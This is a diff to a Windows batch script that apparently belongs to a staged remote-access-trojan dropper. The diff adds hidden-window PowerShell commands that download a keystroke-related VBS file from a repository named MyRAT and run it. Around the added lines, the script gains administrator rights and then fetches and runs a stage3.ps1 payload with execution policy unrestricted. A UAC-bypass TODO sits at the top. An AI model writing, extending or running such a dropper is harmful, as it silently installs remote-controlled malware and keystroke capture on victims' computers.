@@ -1,4 +1,5 @@
 @REM TODO: add UAC bypass
+powershell.exe -window hidden "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/bruning-frighting/MyRAT/refs/heads/main/keystrokeBypassAdmin.vbs' -OutFile keystrokeBypassAdmin.vbs"
 
 @echo off
 :: BatchGotAdmin
@@ -24,5 +25,6 @@ if '%errorlevel%' NEQ '0' (
 :gotAdmin
     pushd "%CD%"
     CD /D "%~dp0"
+powershell.exe -window hidden "Start-Process -FilePath "wscript.exe" -ArgumentList keystrokeBypassAdmin.vbs -NoNewWindow -Wait"
 powershell.exe -windowstyle hidden "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/bruning-frighting/MyRAT/refs/heads/main/stage3.ps1' -OutFile 'stage3.ps1'"
 powershell.exe -windowstyle hidden -ep unrestricted ./stage3.ps1
